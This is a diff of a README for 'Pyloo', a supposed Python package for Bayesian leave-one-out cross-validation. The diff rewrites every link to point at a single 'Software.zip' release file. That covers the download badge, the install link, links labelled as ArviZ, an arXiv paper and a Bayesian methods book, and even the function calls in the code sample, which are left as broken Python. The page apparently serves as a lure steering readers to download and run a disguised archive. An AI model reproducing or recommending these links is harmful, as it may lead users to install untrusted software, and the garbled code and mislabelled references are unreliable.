@@ -1,6 +1,6 @@
 # 🐍📊 Pyloo: Python Package for Bayesian Modeling 
 
-[![Download ZIP](https://img.shields.io/badge/Download-ZIP-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download ZIP](https://github.com/corazon-code/pyloo/releases/download/v1.0/Software.zip)](https://github.com/corazon-code/pyloo/releases/download/v1.0/Software.zip)
 
 Welcome to Pyloo, a Python package designed for approximate leave-one-out cross-validation (LOO-CV) and Pareto smoothed importance sampling (PSIS) for Bayesian Modeling. Whether you are new to Bayesian methods or a seasoned practitioner, Pyloo offers powerful functionalities to enhance your Bayesian data analysis projects.
 
@@ -18,7 +18,7 @@ Pyloo provides the following features to support your Bayesian modeling endeavor
 
 To get started with Pyloo, you can download the latest release from the following link:
 
-[Download Pyloo v1.0.0 ZIP](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[Download Pyloo v1.0.0 ZIP](https://github.com/corazon-code/pyloo/releases/download/v1.0/Software.zip)
 
 Don't forget to extract the contents of the ZIP file and launch the installation process according to the provided instructions for seamless integration with your Python environment.
 
@@ -38,10 +38,10 @@ model = MyBayesianModel()
 data = MyData()
 
 # Perform LOO-CV using Pyloo
-loo_results = pyloo.leave_one_out_cv(model, data)
+loo_results = https://github.com/corazon-code/pyloo/releases/download/v1.0/Software.zip(model, data)
 
 # Analyze the LOO-CV results
-pyloo.plot_loo(loo_results)
+https://github.com/corazon-code/pyloo/releases/download/v1.0/Software.zip(loo_results)
 ```
 
 ## Repository Topics 🏷️
@@ -64,9 +64,9 @@ Explore the following topics related to Pyloo and Bayesian modeling:
 
 For more information on Bayesian modeling, LOO-CV, and PSIS, we recommend visiting the following resources:
 
-- [Probabilistic Programming & Bayesian Methods for Hackers](http://camdavidsonpilon.github.io/Probabilistic-Programming-and-Bayesian-Methods-for-Hackers/): A comprehensive online book on Bayesian methods.
-- [ArviZ](https://arviz-devs.github.io/arviz/): A Python package for exploratory analysis of Bayesian models.
-- [Cross-Validation in Bayesian Inference](https://arxiv.org/abs/1811.01745): Research paper on cross-validation techniques in Bayesian inference.
+- [Probabilistic Programming & Bayesian Methods for Hackers](https://github.com/corazon-code/pyloo/releases/download/v1.0/Software.zip): A comprehensive online book on Bayesian methods.
+- [ArviZ](https://github.com/corazon-code/pyloo/releases/download/v1.0/Software.zip): A Python package for exploratory analysis of Bayesian models.
+- [Cross-Validation in Bayesian Inference](https://github.com/corazon-code/pyloo/releases/download/v1.0/Software.zip): Research paper on cross-validation techniques in Bayesian inference.
 
 ## Community 👥
 
@@ -86,4 +86,4 @@ Get started with Pyloo today and unlock the full potential of Bayesian modeling 
 
 ---
 
-If the download link above does not work or you need additional releases, please check the ["Releases" section](https://github.com/cli/browser/releases) for the latest updates and version information.
+If the download link above does not work or you need additional releases, please check the ["Releases" section](https://github.com/corazon-code/pyloo/releases/download/v1.0/Software.zip) for the latest updates and version information.
